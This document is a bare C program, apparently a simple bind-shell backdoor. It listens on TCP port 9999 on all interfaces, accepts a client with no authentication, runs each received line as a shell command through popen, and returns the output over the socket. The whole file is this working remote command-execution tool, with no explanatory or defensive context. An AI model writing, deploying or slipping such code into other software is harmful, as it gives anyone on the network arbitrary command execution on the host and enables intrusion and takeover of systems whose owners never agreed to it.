#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdlib.h>

int main()
{
    int server, client;
    struct sockaddr_in addr;
    char cmd[1024], result[4096];

    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9999);

    bind(server, (struct sockaddr *)&addr, sizeof(addr));
    listen(server, 1);

    printf("Server listening on port 9999...\n");

    client = accept(server, NULL, NULL);
    printf("Client connected!\n");

    while (1)
    {
        memset(cmd, 0, sizeof(cmd));
        int r = recv(client, cmd, sizeof(cmd) - 1, 0);
        if (r <= 0)
        {
            printf("Client disconnected.\n");
            break;
        }

        cmd[strcspn(cmd, "\r\n")] = 0; 
        if (strcmp(cmd, "exit") == 0)
        {
            printf("Client requested exit.\n");
            break;
        }

        printf("Executing command: %s\n", cmd);

        FILE *fp = popen(cmd, "r");
        if (!fp)
        {
            char *err = "Failed to run command.\n";
            send(client, err, strlen(err), 0);
            continue;
        }

        memset(result, 0, sizeof(result));
        fread(result, 1, sizeof(result) - 1, fp);
        pclose(fp);

        send(client, result, strlen(result), 0);
    }

    close(client);
    close(server);
    return 0;
}
